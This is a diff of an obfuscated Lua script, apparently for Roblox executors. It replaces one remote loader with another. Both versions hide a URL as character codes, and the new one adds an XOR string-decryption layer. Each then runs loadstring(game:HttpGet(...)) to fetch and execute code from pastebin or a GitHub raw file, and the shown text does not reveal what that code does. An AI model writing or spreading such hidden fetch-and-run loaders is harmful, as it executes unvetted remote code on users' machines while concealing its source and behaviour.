@@ -1,1 +1,49 @@
-_G[utf8.char((function() return table.unpack({31179,33050,26412,21152,23494,31532,22235,23618})end)())]=utf8.char((function() return table.unpack({50,48,50,51,48,53,44,113,119,101,115,100,102,120,99,118,112,111,105,107,106,104,110,98,118,113,119,101,114,116,121,117,105,111,112,122,120,99,118,98,110,109,113,97,122,100,114,102,118,104,117,106,109,107,111,97,115,120,99,103,104,110,109,108,107,110,98,103,102,120,122,44,72,89,68,81,74,66,44,87,83,56,53,55,57,54,48,44,113,106,98,106,109,100,119,99,44,98,99})end)())loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,112,56,78,57,102,106,72,115})end)())))()的
+local TABLE_TableIndirection = {};
+
+TABLE_TableIndirection["obf_bitlib%0"] = bit32 or bit;
+
+TABLE_TableIndirection["obf_XOR%0"] = TABLE_TableIndirection["obf_bitlib%0"].bxor;
+
+TABLE_TableIndirection["obf_OR%0"] = TABLE_TableIndirection["obf_bitlib%0"].bor;
+
+TABLE_TableIndirection["obf_AND%0"] = TABLE_TableIndirection["obf_bitlib%0"].band;
+
+TABLE_TableIndirection["obf_stringchar%0"] = string.char;
+
+TABLE_TableIndirection["obf_stringbyte%0"] = string.byte;
+
+TABLE_TableIndirection["obf_stringsub%0"] = string.sub;
+
+TABLE_TableIndirection["obf_bitlib%1"] = bit32 or bit;
+
+TABLE_TableIndirection["obf_XOR%1"] = TABLE_TableIndirection["obf_bitlib%1"].bxor;
+
+TABLE_TableIndirection["obf_tableconcat%0"] = table.concat;
+
+TABLE_TableIndirection["obf_tableinsert%0"] = table.insert;
+
+local function LUAOBFUSACTOR_DECRYPT_STR_0(LUAOBFUSACTOR_STR, LUAOBFUSACTOR_KEY)
+
+	TABLE_TableIndirection["result%0"] = {};	for i = 1, #LUAOBFUSACTOR_STR do
+
+		TABLE_TableIndirection["obf_tableinsert%0"](TABLE_TableIndirection["result%0"], TABLE_TableIndirection["obf_stringchar%0"](TABLE_TableIndirection["obf_XOR%1"](TABLE_TableIndirection["obf_stringbyte%0"](TABLE_TableIndirection["obf_stringsub%0"](LUAOBFUSACTOR_STR, i, TABLE_TableIndirection["obf_AND%0"](i, 1) + TABLE_TableIndirection["obf_OR%0"](i, 1))), TABLE_TableIndirection["obf_stringbyte%0"](TABLE_TableIndirection["obf_stringsub%0"](LUAOBFUSACTOR_KEY, TABLE_TableIndirection["obf_AND%0"](1, (i - 1) % #LUAOBFUSACTOR_KEY) + TABLE_TableIndirection["obf_OR%0"](1, (i - 1) % #LUAOBFUSACTOR_KEY), TABLE_TableIndirection["obf_AND%0"](1, (i - 1) % #LUAOBFUSACTOR_KEY) + TABLE_TableIndirection["obf_OR%0"](1, (i - 1) % #LUAOBFUSACTOR_KEY) + 1))) % 256));
+
+	end
+
+	return TABLE_TableIndirection["obf_tableconcat%0"](TABLE_TableIndirection["result%0"]);
+
+end
+
+TABLE_TableIndirection["TABLE_TableIndirection%0"] = {};
+
+TABLE_TableIndirection["TABLE_TableIndirection%0"][LUAOBFUSACTOR_DECRYPT_STR_0("\42\240\225\247\0\217\143\198\28\221\198\242\43\226\178\213\27\210\215\210\42\232\254\151", "\126\177\163\187\69\134\219\167")] = {};
+
+TABLE_TableIndirection["TABLE_TableIndirection%0"][LUAOBFUSACTOR_DECRYPT_STR_0("\200\2\239\6\224\195\23\204\40\201\249\10\195\46\204\238\38\206\62\204\243\45\136\122", "\156\67\173\74\165")][LUAOBFUSACTOR_DECRYPT_STR_0("\80\100\242\25", "\38\84\215\41\118\220\70")] = {};
+
+TABLE_TableIndirection["TABLE_TableIndirection%0"][LUAOBFUSACTOR_DECRYPT_STR_0("\202\113\52\14\55\193\100\23\32\30\251\121\24\38\27\236\85\21\54\27\241\94\83\114", "\158\48\118\66\114")][LUAOBFUSACTOR_DECRYPT_STR_0("\237\251\97\65", "\155\203\68\112\86\19\197")] = {[1]=tostring(utf8.char((function()
+
+	return table.unpack({104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,87,83,56,53,55,57,54,48,47,45,47,109,97,105,110,47,37,69,56,37,56,52,37,57,65,37,69,54,37,57,67,37,65,67,37,69,55,37,65,67,37,65,67,37,69,52,37,66,56,37,56,57,37,69,53,37,66,49,37,56,50,37,69,53,37,56,65,37,65,48,37,69,53,37,65,70,37,56,54});
+
+end)()))};
+
+loadstring(game:HttpGet(TABLE_TableIndirection["TABLE_TableIndirection%0"][LUAOBFUSACTOR_DECRYPT_STR_0("\204\103\255\26\217\127\76\228\250\74\216\31\242\68\113\247\253\69\201\63\243\78\61\181", "\152\38\189\86\156\32\24\133")][LUAOBFUSACTOR_DECRYPT_STR_0("\80\172\18\246", "\38\156\55\199")][1]))();
